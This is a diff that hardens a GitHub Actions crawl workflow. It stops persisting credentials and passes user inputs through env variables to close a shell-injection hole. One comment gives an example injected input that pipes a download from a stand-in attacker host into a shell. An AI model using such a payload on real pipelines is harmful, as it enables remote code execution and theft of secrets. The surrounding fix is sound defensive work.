@@ -45,6 +45,11 @@ jobs:
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
+        with:
+          # This job never pushes back to the repo, so the default GITHUB_TOKEN doesn't need
+          # to survive in the local git config for later steps (or a compromised third-party
+          # action) to read.
+          persist-credentials: false
 
       - name: Set up Node.js 20
         uses: actions/setup-node@v4
@@ -81,18 +86,31 @@ jobs:
           restore-keys: |
             crawl-state-
 
+      # Both this step and the one below used to interpolate `${{ github.event.inputs.* }}`
+      # and `${{ steps.flags.outputs.flags }}` directly into a `run:` shell block. That
+      # substitution happens at workflow-template-render time, before the shell ever sees the
+      # script — so a manually-triggered `limit` input containing shell metacharacters (e.g.
+      # `1; curl evil.example/x | sh #`) would splice in as literal new shell statements, not
+      # as inert text, with SUPABASE_SERVICE_ROLE_KEY sitting in env two steps later. Routing
+      # the same values through `env:` and referencing them as `$VAR` instead fixes this:
+      # env-block values arrive as opaque runtime strings the shell can only ever treat as
+      # data, never re-parse as script source.
       - name: Build crawl flags
         id: flags
+        env:
+          DRY_RUN_INPUT: ${{ github.event.inputs.dry_run }}
+          FORCE_INPUT: ${{ github.event.inputs.force }}
+          LIMIT_INPUT: ${{ github.event.inputs.limit }}
         run: |
           FLAGS=""
-          if [ "${{ github.event.inputs.dry_run }}" = "true" ]; then
+          if [ "$DRY_RUN_INPUT" = "true" ]; then
             FLAGS="$FLAGS --dry-run"
           fi
-          if [ "${{ github.event.inputs.force }}" = "true" ]; then
+          if [ "$FORCE_INPUT" = "true" ]; then
             FLAGS="$FLAGS --force"
           fi
-          if [ -n "${{ github.event.inputs.limit }}" ]; then
-            FLAGS="$FLAGS --limit ${{ github.event.inputs.limit }}"
+          if [ -n "$LIMIT_INPUT" ]; then
+            FLAGS="$FLAGS --limit $LIMIT_INPUT"
           fi
           echo "flags=$FLAGS" >> "$GITHUB_OUTPUT"
 
@@ -104,9 +122,10 @@ jobs:
           NEXT_PUBLIC_SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
           SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
           EMBEDDING_API_KEY: ${{ secrets.EMBEDDING_API_KEY }}
+          CRAWL_FLAGS: ${{ steps.flags.outputs.flags }}
           # NODE_ENV is not set to production so tsx can resolve devDependencies.
         run: |
-          npm run crawl -- ${{ steps.flags.outputs.flags }}
+          npm run crawl -- $CRAWL_FLAGS
 
       # Always save, even on failure/timeout — a partially-updated state file (entries that
       # completed before a later one failed) is still strictly more useful to the next run
